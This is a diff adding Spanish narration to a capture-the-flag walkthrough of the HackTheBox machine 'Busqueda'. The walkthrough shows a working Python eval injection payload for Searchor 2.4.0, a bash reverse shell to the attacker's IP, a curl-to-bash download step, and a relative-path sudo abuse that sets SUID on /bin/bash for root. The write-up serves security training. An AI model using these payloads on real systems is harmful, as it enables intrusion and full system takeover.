@@ -15,9 +15,15 @@ layout:
 
 # Busqueda
 
+`Busqueda` es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo `Python`. Al aprovechar esta vulnerabilidad, obtenemos acceso a nivel de usuario a la máquina. Para escalar privilegios a `root`, descubrimos credenciales dentro de un archivo de configuración `Git`, lo que nos permite iniciar sesión en un servicio `Gitea` local. Además, descubrimos que un script de verificación del sistema puede ser ejecutado con privilegios `root` por un usuario específico. Al utilizar este script, enumeramos los contenedores `Docker` que revelan las credenciales para la cuenta `Gitea` del usuario `administrador`. Un análisis más detallado del código fuente del script de verificación del sistema en un repositorio `Git` revela un medio para explotar una referencia de ruta relativa, lo que nos otorga Ejecución remota de código (RCE) con privilegios `root`.
 
+<figure><img src="../../.gitbook/assets/Busqueda.png" alt="" width="563"><figcaption></figcaption></figure>
 
+***
 
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Busqueda**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.208 -oG allPorts
@@ -41,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -54,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.208 -A -oN targeted -oX targetedXML
@@ -89,7 +95,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -98,25 +104,27 @@ Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep searcher
 10.10.11.208 searcher.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb http://searcher.htb
 http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
 ```
 
-
+Revisaremos las cabeceras de la página web, podemos confirmar que utiliza como servidor `Werkzeug` y `Python`.
 
 ```bash
 ❯ curl -I http://searcher.htb
@@ -127,7 +135,7 @@ Content-Type: text/html; charset=utf-8
 Content-Length: 13519
 ```
 
-
+Realizamos una enumeración de directorios y páginas web a través de `feroxbuster`, logramos obtener el siguiente resultado.
 
 ```bash
 ❯ feroxbuster -u http://searcher.htb
@@ -164,34 +172,58 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 81s    30001/30001   371/s   http://searcher.htb/  
 ```
 
+Accedemos a[ http://searcher.htb](http://searcher.htb) y verificaremos la siguiente página web.
 
+Esta plataforma nos permite realizar búsquedas en múltiples motores, como Google, YouTube, DuckDuckGo y eBay, entre otros.
+
+Además, nos ofrece la posibilidad de monitorizar menciones públicas en redes sociales y la web, facilitando el seguimiento de nuestra presencia en línea desde un panel centralizado.
+
+Para usarla, solo necesitamos:
+
+1. Seleccionar el motor de búsqueda.
+2. Escribir nuestra consulta.
+3. Hacer clic en "Search".
+
+Si activamos la opción de redirección automática, seremos llevados directamente a los resultados. De lo contrario, obtendremos la URL de la búsqueda para utilizarla como queramos.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una búsqueda básica para ver el funcionamiento de la página web.
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+En el resultado obtenido, verificamos que se ha realizado la siguiente búsqueda.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### Searchor 2.4.0 - Command Injection (CVE-2023-43364)
+
+En la propia página web de `Busqueda`, nos encontramos que la página web utiliza `Flask` y `Searchor 2.4.0`.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+Realizando una búsqueda por Internet de posibles vulnerabilidades sobre esta versión, nos encontramos con el siguiente `CVE-2023-43364`.
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-43364" %}
+
+{% hint style="danger" %}
+main.py en Searchor anterior a 2.4.2 usa eval en la entrada CLI, lo que puede provocar la ejecución inesperada de código.
+{% endhint %}
+
+Por otro lado, nos encontramos con el siguiente repositorio de GitHub que automatiza la explotación de la vulnerabilidad otorgándonos una Reverse Shell.
 
 {% embed url="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection" %}
 
-
+Nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Realizaremos la explotación indicando el target vulnerable y nuestra dirección y puerto donde recibiremos la Reverse Shell.
 
 ```bash
 ❯ ./exploit.sh searcher.htb 10.10.16.7 443
@@ -201,7 +233,7 @@ listening on [any] 443 ...
 [*] Run the Reverse Shell... Press Ctrl+C after successful connection
 ```
 
-
+Verificamos que hemos ganado el acceso correctamente al equipo.
 
 ```bash
 ❯ nc -nlvp 443
@@ -212,9 +244,7 @@ bash: no job control in this shell
 svc@busqueda:/var/www/app$ 
 ```
 
-
-
-
+Para realizar la explotación manual, interceptaremos con `BurpSuite` la solicitud de [http://searcher.htb/search?engine=Google\&query=](http://searcher.htb/search?engine=Google\&query=). Inyectaremos el siguiente comando, al enviar la solicitud, comprobamos en la respuesta por parte del servidor recibimos el resultado de la ejecución de comandos.
 
 ```bash
 ' + __import__('os').popen('id').read() + '
@@ -222,10 +252,10 @@ svc@busqueda:/var/www/app$
 
 <figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+El siguiente paso, será lograr obtener una Reverse Shell. Para ello, crearemos en nuestro equipo un archivo llamado `shell.sh` que contiene la Reverse Shell, compartiremos el script a través de un servidor web.
 
 ```bash
-❯ catnp shell.sh
+❯ cat shell.sh
 #!/bin/bash
 
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'
@@ -234,16 +264,14 @@ svc@busqueda:/var/www/app$
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde otra terminal nos pondremos en escucha con `nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
-
-
+Realizaremos la siguiente inyección de comando para que realize la petición con`cURL` de nuestro script `shell.sh` y lo ejecutará en una `bash`.
 
 ```bash
 ' + __import__('os').popen('curl http://10.10.16.7/shell.sh|bash').read() + '
@@ -251,7 +279,7 @@ listening on [any] 443 ...
 
 <figure><img src="../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que finalmente ganamos acceso al sistema con el usuario`svc` y logramos comprobar la flag de **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -260,10 +288,14 @@ connect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 46348
 bash: cannot set terminal process group (1646): Inappropriate ioctl for device
 bash: no job control in this shell
 svc@busqueda:/var/www/app$ cat /home/svc/user.txt 
-26d7ad943e8f5b32d536c741caf5572f
+26d7ad943e8f5*******************
 ```
 
+## Privilege Escalation
 
+### Information Leakage to access Gitea
+
+Al acceder al equipo, verificamos que al revisar los permisos de `sudoers` nos requiere ingresar las credenciales del usuario, las cuales no disponemos actualmente. Revisamos los grupos a los que forma parte y tampoco disponemos de algún grupo que podamos abusar para escalar nuestros privilegios.
 
 ```bash
 svc@busqueda:/var/www/app/.git$ sudo -l
@@ -273,7 +305,7 @@ svc@busqueda:/var/www/app/.git$ id
 uid=1000(svc) gid=1000(svc) groups=1000(svc)
 ```
 
-
+Enumerando el directorio `/var/www/app` nos encontramos con un repositorio de `/.git` en el cual contiene un archivo de configuración con lo que parecen ser credenciales de acceso del usuario `cody`.
 
 ```bash
 svc@busqueda:/var/www/app$ ls -la
@@ -313,7 +345,7 @@ svc@busqueda:/var/www/app/.git$ cat config
 	merge = refs/heads/main
 ```
 
-
+Enumerando el directorio personal del usuario `svc` también observamos un archivo `.gitconfig` el cual contiene la configuración del usuario `cody`.
 
 ```bash
 svc@busqueda:~$ ls -la
@@ -338,7 +370,7 @@ svc@busqueda:~$ cat .gitconfig
 	hooksPath = no-hooks
 ```
 
-
+Revisaremos los puertos internos del equipo, y logramos encontrar el puerto **3000** abierto, que normalmente es utilizado para `Gitea`.
 
 ```bash
 svc@busqueda:/var/www/app/.git$ netstat -ano | grep LISTEN
@@ -353,7 +385,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
 ```
 
-
+Realizamos una petición con `cURL` al servidor **127.0.0.1:3000** en el cual nos devuelve información de la página web relacionada con `Gitea`.
 
 ```bash
 svc@busqueda:/var/www/app/.git$ curl 127.0.0.1:3000
@@ -372,7 +404,7 @@ svc@busqueda:/var/www/app/.git$ curl 127.0.0.1:3000
 	<meta name="referrer" content="no-referrer">
 ```
 
-
+El siguiente objetivo será realizar **Port Forwarding** con `chisel` para lograr tener acceso a la página web de `Gitea`. Para ello, compartiremos el binario de `chisel` a través de un servidor web.
 
 ```bash
 ❯ ls -l chisel
@@ -382,7 +414,7 @@ svc@busqueda:/var/www/app/.git$ curl 127.0.0.1:3000
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo comprometido, nos descargaremos el binario de `chisel` y le daremos los permisos de ejecución correspondientes.
 
 ```bash
 svc@busqueda:/tmp$ wget 10.10.16.7/chisel
@@ -399,7 +431,7 @@ chisel              100%[===================>]   8.94M  14.4MB/s    in 0.6s
 svc@busqueda:/tmp$ chmod +x chisel 
 ```
 
-
+En nuestro equipo local, configuraremos `chisel` para que actúe como servidor.
 
 ```bash
 ❯ ./chisel server --reverse -p 1234
@@ -408,7 +440,7 @@ svc@busqueda:/tmp$ chmod +x chisel
 2025/02/13 06:28:08 server: Listening on http://0.0.0.0:1234
 ```
 
-
+Desde el equipo comprometido, configuraremos `chisel` para que actúe como cliente de nuestro servidor y compartiremos el puerto 3000 interno a que sea el puerto 80 de nuestro equipo local.
 
 ```bash
 svc@busqueda:/tmp$ ./chisel client 10.10.16.7:1234 R:80:127.0.0.1:3000
@@ -416,24 +448,30 @@ svc@busqueda:/tmp$ ./chisel client 10.10.16.7:1234 R:80:127.0.0.1:3000
 2025/02/13 05:36:42 client: Connected (Latency 33.301115ms)
 ```
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
-❯ catnp /etc/hosts | grep searcher
+❯ cat /etc/hosts | grep searcher
 127.0.0.1	localhost kali gitea.searcher.htb
 ```
 
-
+Accederemos a [http://gitea.searcher.htb](http://gitea.searcher.htb) y probaremos de acceder con las credenciales del usuario `cody` localizadas anteriormente.
 
 <figure><img src="../../.gitbook/assets/imagen (9) (1).png" alt=""><figcaption></figcaption></figure>
 
+Enumerando el `Gitea`, logramos encontrar un repositorio propio de nuestro usuario.
+
 <figure><img src="../../.gitbook/assets/imagen (10) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Revisamos el repositorio que disponemos, y comprobamos que se trata del archivo de `Searchor`, la página web desde la cual obtuvimos el acceso inicial al sistema.
 
 <figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>
 
+### Abusing sudoers privilege + Information Leakage in Docker Containers
 
+Probamos de validar si las credenciales del usuario `cody` de `Gitea` servían para el usuario `svc` y comprobamos que son sus credenciales correctas.
+
+Al analizar si disponíamos de privilegios de `sudoers`, nos encontramos que podemos ejecutar el siguiente script en `/opt/scripts/system-checkup.py`.
 
 ```bash
 svc@busqueda:~$ sudo -l
@@ -447,13 +485,32 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
+Enumeramos el directorio `/opt/scripts` en los cuales aparecen diversos script de Bash y Python, al intentar comprobar el contenido de estos archivos se nos indica `Permission denied`.
 
+```bash
+svc@busqueda:~$ ls -l /opt/scripts/
+total 16
+-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
+-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
+-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
+-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
+
+svc@busqueda:~$ cat /opt/scripts/*
+cat: /opt/scripts/check-ports.py: Permission denied
+cat: /opt/scripts/full-checkup.sh: Permission denied
+cat: /opt/scripts/install-flask.sh: Permission denied
+cat: /opt/scripts/system-checkup.py: Permission denied
+```
+
+Probamos de ejecutar el script de Python como `sudo` y nos aparece un mensaje indicando que no disponemos del acceso para ejecutar el binario.
+
+Al intentar poner otro valor a la hora de ejecutar el script, verificamos que nos permite ejecutar diversos comandos de `Docker`, como listar los contenedores en ejecución, inspeccionar y realizar un escaneo del sistema.
 
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
 Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
 
-svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py a
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py h
 Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 
      docker-ps     : List running docker containers
@@ -461,7 +518,7 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
      full-checkup  : Run a full system checkup
 ```
 
-
+A través del siguiente comando, comprobaremos mediante el script `system-checkup.py` los contenedores de Docker en ejecución, entre los que encontramos contenedores de `Gitea` y `MySQL`.
 
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
@@ -470,18 +527,18 @@ CONTAINER ID   IMAGE                COMMAND                  CREATED       STATU
 f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
 ```
 
-
+Al intentar inspeccionar el contenedor, se nos indica el uso correcto de la herramienta, se nos requiere especificar el formato y el nombre del contenedor.
 
 ```bash
-svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect f84a6b33fb5a
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea
 Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 ```
 
-
+Por la estructura del comando, parece ser comandos de Docker nativos. Con lo cual, decidimos consultar la información oficial de `Docker` sobre el comando de `docker` `inspect`
 
 {% embed url="https://docs.docker.com/reference/cli/docker/inspect/" %}
 
-
+En este caso, inspeccionamos el contenedor de `Gitea` para que nos muestre el resultado en formato `JSON`. En el resultado obtenido, nos aparecen credenciales de una base de datos llamada `gitea`.
 
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
@@ -526,10 +583,10 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
     ],
 ```
 
-
+Inspeccionamos el contenedor `mysql` para enumerar la configuración de dicho contenedor, la información era bastante amplia.
 
 ```bash
-svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e | jq .
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql | jq .
 {
     "Tty": false,
     "OpenStdin": false,
@@ -562,16 +619,14 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 }
 ```
 
-
-
-
+Al realizar la ejecución del último comando, se nos indicaba que había ocurrido algún error, intentamos añadir algún parámetro, etc pero obtuvimos siempre le mismo resultado.
 
 ```bash
 svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
 Something went wrong
 ```
 
-
+Enumeramos la configuración de red que disponía el contenedor de `mysql`. En el resultado obtenido, comprobamos que el contenedor de `mysql` operaba a través de la IP **172.19.0.3**.
 
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
@@ -596,7 +651,7 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
   }
 ```
 
-
+Revisamos la interfaz de `docker0` que tenía el equipo comprometido y verificamos que estuviese y tuviese conectividad con la que operaba el `MySQL`.
 
 ```bash
 svc@busqueda:~$ ifconfig docker0
@@ -617,9 +672,9 @@ PING 172.19.0.2 (172.19.0.3) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
 ```
 
+Probamos de acceder al `MySQL` del contenedor de Docker con el usuario `gitea` y las credenciales localizadas en la configuración del contenedor `gitea` a través de la dirección IP **172.19.0.3**.&#x20;
 
-
-
+Logramos obtener el acceso correspondiente y enumerar las tablas, entre las cuales aparecía la tabla `users`.
 
 ```bash
 svc@busqueda:~$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
@@ -738,7 +793,7 @@ mysql> SHOW TABLES;
 91 rows in set (0.01 sec)
 ```
 
-
+Al enumerar los valores de la tabla `users`, nos encontramos con las credenciales del usuario `administrator` para `Gitea`.
 
 ```bash
 mysql> SELECT * FROM user;
@@ -751,29 +806,43 @@ mysql> SELECT * FROM user;
 2 rows in set (0.00 sec)
 ```
 
+### Accessing on Gitea with Administrator's user
 
+Volvimos a nuestro equipo local donde tenemos acceso al `Gitea` mediante **Port Forwarding**. Probamos de acceder con las credenciales del usuario `Administrator` localizadas en el punto anterior y comprobamos del acceso correspondiente. También, logramos verificar que disponíamos de un repositorio llamado `scripts`.&#x20;
 
 <figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>
 
+Al acceder al repositorio de `scripts`, logramos visualizar diferentes archivos/scripts que parecen ser los que se encontraban en `/opt/scripts` que inicialmente no podíamos visualizar su contenido.
+
+El primer script que logramos visualizar es el de `check-ports.py` el cual después de revisarlo, no logramos sacar nada relevante.
+
 <figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>
 
-
+A continuación, se muestra el contenido de `full-checkup.sh`.
 
 <figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>
 
-
+Contenido del script `install-flask.sh`
 
 <figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>
 
-
+Contenido del script `system-checkup.py`.
 
 <figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>
 
+### Relative Path Exploitation in Script
 
+Después de una revisión exhaustiva de los scripts encontrados, nos encontramos que el script `full-checkup.sh` podíamos llegar a obtener acceso como root debido a una mala configuración.
+
+En el archivo del script, se mencionaba la función `full-checkup` en la cual probaba de ejecutar un script llamado `full-checkup.sh`. De la manera que está representado este valor, no se le indica la ruta absoluta del archivo de Bash, con lo cual nos puede permitir crear un archivo con el mismo nombre que realice otra acción que deseemos. Recordemos que este script lo ejecutamos como usuario `sudo`, con lo cual podríamos llegar a modificar archivos, etc para lograr acceso al sistema.
 
 <figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>
 
+Por lo tanto, decidimos de crear un archivo llamado `full-checkup.sh` que lo que realizaría es otorgar al binario `/bin/bash` permisos de `SUID`.
 
+Al ejecutar el script con la función `full-checkup`, al disponer del script malicioso en el mismo repositorio, se nos indicó el mensaje de `Done`.
+
+Revisamos los permisos de `/bin/bash` y comprobamos que tiene permisos de `SUID`. Nos aprovechamos de esto para convertirnos en usuario`root` y visualizar la flag de **root.txt**.
 
 ```bash
 svc@busqueda:/tmp$ ls -l full-checkup.sh 
@@ -791,5 +860,5 @@ svc@busqueda:/tmp$ bash -p
 bash-5.1$ whoami
 root
 bash-5.1$ cat /root/root.txt 
-219cc898cfb210bbb3bf2c0390d1e6ec
+219cc898cfb2*********************
 ```
